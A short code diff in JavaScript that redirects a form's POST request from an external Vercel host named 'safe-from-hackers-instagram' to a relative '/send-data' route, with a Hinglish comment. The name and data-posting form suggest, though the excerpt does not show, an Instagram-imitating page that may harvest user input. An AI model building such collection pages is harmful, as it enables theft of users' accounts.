@@ -99,7 +99,8 @@
       submitBtn.innerText = "Please wait...";
 
       try {
-        const response = await fetch(https://safe-from-hackers-instagram-kot62made.vercel.app/', {
+        // Relative path '/send-data' use kiya hai jo server.js ke route se exact match karta hai
+        const response = await fetch('/send-data', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
